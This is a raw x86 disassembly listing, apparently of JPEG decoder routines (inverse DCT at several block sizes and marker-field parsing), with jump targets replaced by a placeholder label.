fadd [ ebp - 0x20 ]
call sub_48aba4
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi ] cl
fld [ ebp - 0x4 ]
fsub [ ebp - 0x20 ]
call sub_48aba4
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x7 ] cl
fld [ ebp - 0x8 ]
fadd [ ebp - 0x1c ]
call sub_48aba4
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x1 ] cl
fld [ ebp - 0x8 ]
fsub [ ebp - 0x1c ]
call sub_48aba4
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x6 ] cl
fld [ ebp - 0xc ]
fadd [ ebp - 0x18 ]
call sub_48aba4
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x2 ] cl
fld [ ebp - 0xc ]
fsub [ ebp - 0x18 ]
call sub_48aba4
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x5 ] cl
fld [ ebp - 0x10 ]
fadd [ ebp - 0x14 ]
call sub_48aba4
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x4 ] cl
fld [ ebp - 0x10 ]
fsub [ ebp - 0x14 ]
call sub_48aba4
add eax 0x4
mov edx [ ebp - 0x48 ]
sar eax 0x3
add ebx 0x20
and eax 0x3ff
inc edi
mov cl [ edx + eax ]
mov [ esi + 0x3 ] cl
add [ ebp - 0x50 ] 0x4
cmp edi 0x8
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0x40 ] 0x0
jne r-xdata
cmp [ eax + 0x50 ] 0x0
jne r-xdata
cmp [ eax + 0x60 ] 0x0
jne r-xdata
cmp [ eax + 0x70 ] 0x0
jne r-xdata
fild [ eax ]
add eax 0x2
fmul [ edx ]
add edx 0x4
fstp [ ebp - 0x4c ]
mov ecx [ ebp - 0x4c ]
mov [ ebx ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x20 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x40 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x60 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x80 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xa0 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xc0 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xe0 ] ecx
add ebx 0x4
jmp r-xdata
dec edi
test edi edi
jg r-xdata
sub_494edc
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x144 ]
add edx 0x80
mov [ ebp - 0x38 ] edx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x140 ]
mov [ ebp - 0x3c ] 0x8
movsx ecx [ edx ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx ]
mov [ ebp - 0x10 ] ecx
movsx ecx [ edx + 0x20 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0x40 ]
mov [ ebp - 0x14 ] ecx
movsx ecx [ edx + 0x40 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0x80 ]
mov [ ebp - 0x18 ] ecx
movsx ecx [ edx + 0x60 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0xc0 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x10 ]
mov ebx [ ebp - 0x10 ]
mov esi [ ebp - 0x14 ]
add ebx [ ebp - 0x18 ]
sub ecx [ ebp - 0x18 ]
add esi [ ebp - 0x1c ]
mov [ ebp - 0x28 ] esi
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x28 ]
sub esi [ ebp - 0x1c ]
imul esi esi 0x16a
sar esi 0x8
add edi ebx
sub esi [ ebp - 0x28 ]
mov [ ebp - 0x10 ] edi
sub ebx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] ebx
lea ebx [ esi + ecx ]
sub ecx esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ecx
movsx ecx [ edx + 0x10 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0x20 ]
mov [ ebp - 0x20 ] ecx
movsx ecx [ edx + 0x30 ]
mov ebx [ ebp - 0x34 ]
mov edi [ ebp - 0x34 ]
movsx esi [ edx + 0x50 ]
imul ecx [ ebx + 0x60 ]
mov ebx [ ebp - 0x34 ]
imul esi [ ebx + 0xa0 ]
movsx ebx [ edx + 0x70 ]
imul ebx [ edi + 0xe0 ]
mov [ ebp - 0x24 ] ebx
lea ebx [ ecx + esi ]
sub esi ecx
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x24 ]
mov edi [ ebp - 0x20 ]
sub edi [ ebp - 0x24 ]
add edx 0x2
mov [ ebp - 0x30 ] edi
lea edi [ ebx + ecx ]
sub ecx ebx
mov [ ebp - 0x24 ] edi
mov ebx [ ebp - 0x30 ]
imul ecx ecx 0x16a
add ebx esi
imul esi esi 0xfffffd63
mov edi ebx
shl ebx 0x4
sub ebx edi
shl ebx 0x2
sub ebx edi
sar esi 0x8
sar ecx 0x8
lea ebx [ edi + ebx * 8 ]
sar ebx 0x8
mov [ ebp - 0x2c ] ebx
add esi [ ebp - 0x2c ]
mov ebx [ ebp - 0x30 ]
mov edi ebx
sub esi [ ebp - 0x24 ]
shl ebx 0x4
sub ecx esi
add ebx edi
lea ebx [ edi + ebx * 4 ]
lea ebx [ edi + ebx * 4 ]
sar ebx 0x8
sub ebx [ ebp - 0x2c ]
lea ebx [ ecx + ebx ]
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x24 ]
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
sub ebx [ ebp - 0x24 ]
mov [ eax + 0xe0 ] ebx
mov ebx [ ebp - 0x14 ]
add ebx esi
mov [ eax + 0x20 ] ebx
mov ebx [ ebp - 0x14 ]
sub ebx esi
mov [ eax + 0xc0 ] ebx
mov ebx [ ebp - 0x18 ]
add ebx ecx
mov [ eax + 0x40 ] ebx
mov ebx [ ebp - 0x18 ]
sub ebx ecx
mov [ eax + 0xa0 ] ebx
mov ecx [ ebp - 0x1c ]
add ecx [ ebp - 0x20 ]
mov [ eax + 0x80 ] ecx
mov ecx [ ebp - 0x1c ]
sub ecx [ ebp - 0x20 ]
mov [ eax + 0x60 ] ecx
add [ ebp - 0x34 ] 0x4
add eax 0x4
cmp [ edx + 0x20 ] 0x0
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0x140 ]
xor edx edx
mov [ ebp - 0x3c ] edx
mov edx [ ebp + 0xc ]
mov ecx edx
mov [ ebp - 0x40 ] ecx
cmp [ edx + 0x30 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov esi [ eax + 0x10 ]
mov ebx ecx
sub ecx esi
add ebx esi
mov esi [ eax + 0x8 ]
mov edi esi
add edi [ eax + 0x18 ]
mov [ ebp - 0x28 ] edi
sub esi [ eax + 0x18 ]
imul esi esi 0x16a
sar esi 0x8
mov edi [ ebp - 0x28 ]
sub esi [ ebp - 0x28 ]
add edi ebx
mov [ ebp - 0x10 ] edi
sub ebx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] ebx
lea ebx [ esi + ecx ]
sub ecx esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ecx
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x4 ]
mov ebx ecx
mov esi ecx
mov ecx [ eax + 0x4 ]
add ecx [ eax + 0x1c ]
add ebx [ eax + 0xc ]
sub esi [ eax + 0xc ]
sub edi [ eax + 0x1c ]
mov [ ebp - 0x30 ] edi
lea edi [ ebx + ecx ]
sub ecx ebx
mov [ ebp - 0x24 ] edi
mov ebx [ ebp - 0x30 ]
imul ecx ecx 0x16a
add ebx esi
imul esi esi 0xfffffd63
mov edi ebx
shl ebx 0x4
sub ebx edi
shl ebx 0x2
sub ebx edi
sar esi 0x8
sar ecx 0x8
lea ebx [ edi + ebx * 8 ]
sar ebx 0x8
mov [ ebp - 0x2c ] ebx
add esi [ ebp - 0x2c ]
mov ebx [ ebp - 0x30 ]
mov edi ebx
sub esi [ ebp - 0x24 ]
shl ebx 0x4
sub ecx esi
add ebx edi
lea ebx [ edi + ebx * 4 ]
lea ebx [ edi + ebx * 4 ]
sar ebx 0x8
sub ebx [ ebp - 0x2c ]
lea ebx [ ecx + ebx ]
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x10 ]
mov edi [ ebp - 0x38 ]
add ebx [ ebp - 0x24 ]
sar ebx 0x5
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ edx ] bl
mov ebx [ ebp - 0x10 ]
mov edi [ ebp - 0x38 ]
sub ebx [ ebp - 0x24 ]
sar ebx 0x5
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ edx + 0x7 ] bl
mov ebx [ ebp - 0x14 ]
mov edi [ ebp - 0x38 ]
add ebx esi
sar ebx 0x5
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0x14 ]
sub ebx esi
mov esi [ ebp - 0x38 ]
sar ebx 0x5
and ebx 0x3ff
mov bl [ esi + ebx ]
mov [ edx + 0x6 ] bl
mov ebx [ ebp - 0x18 ]
mov esi [ ebp - 0x38 ]
add ebx ecx
sar ebx 0x5
and ebx 0x3ff
mov bl [ esi + ebx ]
mov [ edx + 0x2 ] bl
mov ebx [ ebp - 0x18 ]
sub ebx ecx
mov ecx [ ebp - 0x38 ]
sar ebx 0x5
and ebx 0x3ff
mov cl [ ecx + ebx ]
mov [ edx + 0x5 ] cl
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x38 ]
add ecx [ ebp - 0x20 ]
sar ecx 0x5
and ecx 0x3ff
mov cl [ ebx + ecx ]
mov [ edx + 0x4 ] cl
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x38 ]
sub ecx [ ebp - 0x20 ]
sar ecx 0x5
and ecx 0x3ff
add eax 0x20
mov cl [ ebx + ecx ]
mov [ edx + 0x3 ] cl
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ edx + 0x40 ] 0x0
jne r-xdata
mov edx [ ebp - 0x40 ]
mov edx [ edx ]
add edx [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ edx + 0x50 ] 0x0
jne r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ edx + 0x60 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ edx + 0x70 ] 0x0
jne r-xdata
cmp [ eax + 0x18 ] 0x0
jne r-xdata
movsx ecx [ edx ]
mov ebx [ ebp - 0x34 ]
add edx 0x2
imul ecx [ ebx ]
mov [ eax ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x60 ] ecx
mov [ eax + 0x80 ] ecx
mov [ eax + 0xa0 ] ecx
mov [ eax + 0xc0 ] ecx
mov [ eax + 0xe0 ] ecx
add [ ebp - 0x34 ] 0x4
add eax 0x4
jmp r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0x3c ]
cmp [ ebp - 0x3c ] 0x0
jg r-xdata
mov ecx [ eax ]
sar ecx 0x5
and ecx 0x3ff
mov ebx [ ebp - 0x38 ]
mov cl [ ebx + ecx ]
mov [ edx ] cl
mov [ edx + 0x1 ] cl
mov [ edx + 0x2 ] cl
mov [ edx + 0x3 ] cl
mov [ edx + 0x4 ] cl
mov [ edx + 0x5 ] cl
mov [ edx + 0x6 ] cl
mov [ edx + 0x7 ] cl
add eax 0x20
jmp r-xdata
inc [ ebp - 0x3c ]
add [ ebp - 0x40 ] 0x4
cmp [ ebp - 0x3c ] 0x8
jl r-xdata
sub_495310
push ebp
mov ebp esp
add esp 0xffffff58
push ebx
push esi
push edi
mov eax [ eax + 0x144 ]
add eax 0x80
mov [ ebp - 0x20 ] eax
mov ebx ecx
mov eax [ edx + 0x50 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0x24 ] 0x8
add ebx 0x2
add [ ebp - 0x1c ] 0x4
add eax 0x4
dec [ ebp - 0x24 ]
cmp [ ebp - 0x24 ] 0x0
jg r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x24 ] 0x4
je r-xdata
lea eax [ ebp - 0xa8 ]
xor edx edx
mov [ ebp - 0x24 ] edx
mov edx [ ebp + 0xc ]
mov ecx edx
mov [ ebp - 0x28 ] ecx
movsx edx [ ebx ]
mov ecx [ ebp - 0x1c ]
mov esi [ ebp - 0x1c ]
imul edx [ ecx ]
movsx ecx [ ebx + 0x20 ]
imul ecx [ esi + 0x40 ]
mov [ ebp - 0x10 ] ecx
movsx ecx [ ebx + 0x60 ]
mov esi [ ebp - 0x1c ]
imul ecx [ esi + 0xc0 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x10 ]
mov esi ecx
shl ecx 0x4
sub ecx esi
shl ecx 0x2
sub ecx esi
shl edx 0xe
lea ecx [ esi + ecx * 8 ]
shl ecx 0x5
add ecx esi
mov esi [ ebp - 0x14 ]
mov edi esi
neg esi
lea esi [ edi + esi * 4 ]
shl esi 0x4
sub esi edi
shl esi 0x6
add esi edi
add esi esi
add ecx esi
lea esi [ ecx + edx ]
sub edx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] edx
movsx edx [ ebx + 0x70 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0xe0 ]
mov [ ebp - 0xc ] edx
movsx edx [ ebx + 0x50 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0xa0 ]
mov [ ebp - 0x10 ] edx
movsx edx [ ebx + 0x30 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0x60 ]
mov [ ebp - 0x14 ] edx
movsx edx [ ebx + 0x10 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0x20 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0xc ]
mov ecx edx
neg edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 4 ]
shl edx 0x5
sub edx ecx
imul ecx [ ebp - 0x10 ] 0x2e75
add edx edx
add edx ecx
imul ecx [ ebp - 0x14 ] 0xffffba79
add edx ecx
mov ecx [ ebp - 0x18 ]
mov esi ecx
shl ecx 0x4
add ecx esi
shl ecx 0x6
sub ecx esi
lea ecx [ esi + ecx * 8 ]
add edx ecx
mov ecx [ ebp - 0xc ]
mov esi ecx
neg ecx
shl ecx 0x6
sub ecx esi
shl ecx 0x2
sub ecx esi
imul esi [ ebp - 0x10 ] 0xffffecc2
shl ecx 0x4
add ecx esi
imul esi [ ebp - 0x14 ] 0x1ccd
add ecx esi
mov esi [ ebp - 0x18 ]
mov edi esi
lea esi [ edi + esi * 4 ]
lea esi [ edi + esi * 8 ]
shl esi 0x8
add esi edi
lea esi [ edi + esi * 2 ]
add ecx esi
mov esi [ ebp - 0x4 ]
add esi ecx
add esi 0x800
sar esi 0xc
mov [ eax ] esi
mov esi [ ebp - 0x4 ]
sub esi ecx
add esi 0x800
sar esi 0xc
mov [ eax + 0x60 ] esi
mov ecx [ ebp - 0x8 ]
add ecx edx
add ecx 0x800
sar ecx 0xc
mov [ eax + 0x20 ] ecx
mov ecx [ ebp - 0x8 ]
sub ecx edx
add ecx 0x800
sar ecx 0xc
mov [ eax + 0x40 ] ecx
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax ]
mov ebx ecx
shl ecx 0x4
sub ecx ebx
shl ecx 0x2
sub ecx ebx
shl edx 0xe
lea ecx [ ebx + ecx * 8 ]
shl ecx 0x5
add ecx ebx
mov ebx [ eax + 0x18 ]
mov edi ebx
neg ebx
lea ebx [ edi + ebx * 4 ]
shl ebx 0x4
sub ebx edi
shl ebx 0x6
add ebx edi
add ebx ebx
add ecx ebx
lea ebx [ ecx + edx ]
sub edx ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1c ]
mov [ ebp - 0xc ] edx
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x10 ] ecx
mov edx [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0xc ]
mov ecx edx
neg edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 4 ]
shl edx 0x5
sub edx ecx
imul ecx [ ebp - 0x10 ] 0x2e75
add edx edx
add edx ecx
imul ecx [ ebp - 0x14 ] 0xffffba79
add edx ecx
mov ecx [ ebp - 0x18 ]
mov ebx ecx
shl ecx 0x4
add ecx ebx
shl ecx 0x6
sub ecx ebx
lea ecx [ ebx + ecx * 8 ]
add edx ecx
mov ecx [ ebp - 0xc ]
mov ebx ecx
neg ecx
shl ecx 0x6
sub ecx ebx
shl ecx 0x2
sub ecx ebx
imul ebx [ ebp - 0x10 ] 0xffffecc2
shl ecx 0x4
add ecx ebx
imul ebx [ ebp - 0x14 ] 0x1ccd
add ecx ebx
mov ebx [ ebp - 0x18 ]
mov edi ebx
lea ebx [ edi + ebx * 4 ]
lea ebx [ edi + ebx * 8 ]
shl ebx 0x8
add ebx edi
lea ebx [ edi + ebx * 2 ]
mov edi [ ebp - 0x20 ]
add ecx ebx
mov ebx [ ebp - 0x4 ]
add ebx ecx
add ebx 0x40000
sar ebx 0x13
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ esi ] bl
mov ebx [ ebp - 0x4 ]
sub ebx ecx
mov ecx [ ebp - 0x20 ]
add ebx 0x40000
sar ebx 0x13
and ebx 0x3ff
mov cl [ ecx + ebx ]
mov [ esi + 0x3 ] cl
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x20 ]
add ecx edx
add ecx 0x40000
sar ecx 0x13
and ecx 0x3ff
mov cl [ ebx + ecx ]
mov [ esi + 0x1 ] cl
mov ecx [ ebp - 0x8 ]
sub ecx edx
mov edx [ ebp - 0x20 ]
add ecx 0x40000
sar ecx 0x13
and ecx 0x3ff
add eax 0x20
mov dl [ edx + ecx ]
mov [ esi + 0x2 ] dl
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x28 ]
mov esi [ edx ]
add esi [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x50 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
cmp [ eax + 0x18 ] 0x0
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
movsx edx [ ebx ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx ]
shl edx 0x2
mov [ eax ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x60 ] edx
jmp r-xdata
mov edx [ eax ]
add edx 0x10
sar edx 0x5
and edx 0x3ff
mov ecx [ ebp - 0x20 ]
mov dl [ ecx + edx ]
mov [ esi ] dl
mov [ esi + 0x1 ] dl
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] dl
add eax 0x20
jmp r-xdata
inc [ ebp - 0x24 ]
add [ ebp - 0x28 ] 0x4
cmp [ ebp - 0x24 ] 0x4
jl r-xdata
sub_4956c4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov eax [ eax + 0x144 ]
add eax 0x80
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x54 ]
mov edx [ edx + 0x50 ]
mov [ ebp - 0x8 ] edx
mov edx 0x8
add ecx 0x2
add [ ebp - 0x8 ] 0x4
add eax 0x4
dec edx
test edx edx
jg r-xdata
cmp edx 0x4
je r-xdata
cmp edx 0x6
je r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x14 ] ecx
xor edx edx
cmp edx 0x2
je r-xdata
mov ebx [ eax ]
shl ebx 0xf
mov [ ebp - 0x4 ] ebx
imul ebx [ eax + 0x14 ] 0x1b37
imul esi [ eax + 0x1c ] 0xffffe8ee
add esi ebx
imul ebx [ eax + 0xc ] 0xffffd746
add esi ebx
mov ebx [ eax + 0x4 ]
mov edi ebx
shl ebx 0x3
sub ebx edi
lea ebx [ edi + ebx * 4 ]
shl ebx 0x8
sub ebx edi
mov edi [ ebp - 0xc ]
shl ebx 0x2
add esi ebx
mov ebx [ ebp - 0x4 ]
add ebx esi
add ebx 0x80000
sar ebx 0x14
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ ecx ] bl
mov ebx [ ebp - 0x4 ]
sub ebx esi
mov esi [ ebp - 0xc ]
add ebx 0x80000
sar ebx 0x14
and ebx 0x3ff
add eax 0x20
mov bl [ esi + ebx ]
mov [ ecx + 0x1 ] bl
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx ]
add ecx [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0x14 ] 0x0
jne r-xdata
movsx ebx [ ecx ]
mov esi [ ebp - 0x8 ]
imul ebx [ esi ]
shl ebx 0xf
mov [ ebp - 0x4 ] ebx
movsx ebx [ ecx + 0x70 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x8 ]
imul ebx [ esi + 0xe0 ]
imul esi ebx 0xffffe8ee
movsx ebx [ ecx + 0x50 ]
imul ebx [ edi + 0xa0 ]
imul ebx ebx 0x1b37
add esi ebx
mov edi [ ebp - 0x8 ]
movsx ebx [ ecx + 0x30 ]
imul ebx [ edi + 0x60 ]
imul ebx ebx 0xffffd746
add esi ebx
mov edi [ ebp - 0x8 ]
movsx ebx [ ecx + 0x10 ]
imul ebx [ edi + 0x20 ]
mov edi ebx
shl ebx 0x3
sub ebx edi
lea ebx [ edi + ebx * 4 ]
shl ebx 0x8
sub ebx edi
shl ebx 0x2
add esi ebx
mov ebx [ ebp - 0x4 ]
add ebx esi
add ebx 0x1000
sar ebx 0xd
mov [ eax ] ebx
mov ebx [ ebp - 0x4 ]
sub ebx esi
add ebx 0x1000
sar ebx 0xd
mov [ eax + 0x20 ] ebx
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ebx [ eax ]
mov esi [ ebp - 0xc ]
add ebx 0x10
sar ebx 0x5
and ebx 0x3ff
add eax 0x20
mov bl [ esi + ebx ]
mov [ ebp - 0xd ] bl
mov bl [ ebp - 0xd ]
mov [ ecx ] bl
mov bl [ ebp - 0xd ]
mov [ ecx + 0x1 ] bl
jmp r-xdata
cmp [ ecx + 0x70 ] 0x0
jne r-xdata
inc edx
add [ ebp - 0x14 ] 0x4
cmp edx 0x2
jl r-xdata
movsx ebx [ ecx ]
mov esi [ ebp - 0x8 ]
imul ebx [ esi ]
shl ebx 0x2
mov [ eax ] ebx
mov [ eax + 0x20 ] ebx
jmp r-xdata
sub_4958b4
push ebp
mov ebp esp
push esi
mov esi [ eax + 0x144 ]
mov eax [ edx + 0x50 ]
movsx edx [ ecx ]
imul edx [ eax ]
mov eax edx
add esi 0x80
add eax 0x4
mov ecx [ ebp + 0xc ]
sar eax 0x3
and eax 0x3ff
mov dl [ esi + eax ]
mov eax [ ecx ]
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] dl
pop esi
pop ebp
retn 0x8
sub_4958f0
push ebx
mov ebx eax
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x66
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov edx [ ebx + 0x1b8 ]
cmp [ edx + 0xc ] 0x0
je r-xdata
xor edx edx
lea eax [ ebx + 0xe4 ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x3d
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ eax ] 0x0
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x20 ] 0x5
inc edx
inc eax
cmp edx 0x10
jl r-xdata
xor ecx ecx
xor eax eax
mov [ ebx + 0x114 ] ecx
mov [ ebx + 0x28 ] eax
xor edx edx
xor ecx ecx
mov [ ebx + 0x12c ] edx
mov [ ebx + 0x118 ] ecx
mov [ ebx + 0x11c ] 0x1
mov [ ebx + 0x11d ] 0x1
mov [ ebx + 0x11e ] 0x0
mov [ ebx + 0x120 ] 0x1
mov [ ebx + 0x122 ] 0x1
xor eax eax
mov [ ebx + 0x124 ] eax
mov eax 0x1
mov [ ebx + 0x128 ] 0x0
mov edx [ ebx + 0x1b8 ]
mov [ edx + 0xc ] 0x1
pop ebx
retn
sub_4959a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov eax [ ebx + 0x18 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
mov eax [ esp ]
test edi edi
mov [ ebx + 0xdc ] eax
mov edx [ esp + 0x4 ]
mov [ ebx + 0xe0 ] edx
jne r-xdata
dec edi
movzx ebp [ esi ]
shl ebp 0x8
inc esi
test edi edi
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
add ebp eax
inc esi
test edi edi
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
mov [ ebx + 0xd4 ] eax
inc esi
test edi edi
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
dec edi
mov al [ esi ]
inc esi
shl eax 0x8
test edi edi
mov [ ebx + 0x20 ] eax
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
add [ ebx + 0x20 ] eax
inc esi
test edi edi
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
shl eax 0x8
test edi edi
mov [ ebx + 0x1c ] eax
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
add [ ebx + 0x1c ] eax
inc esi
test edi edi
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
sub ebp 0x8
mov [ ebx + 0x24 ] eax
mov eax [ ebx ]
add eax 0x18
mov edx [ ebx + 0x1a0 ]
mov [ eax ] edx
mov ecx [ ebx + 0x1c ]
mov [ eax + 0x4 ] ecx
mov edx [ ebx + 0x20 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x24 ]
mov [ eax + 0xc ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x64
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
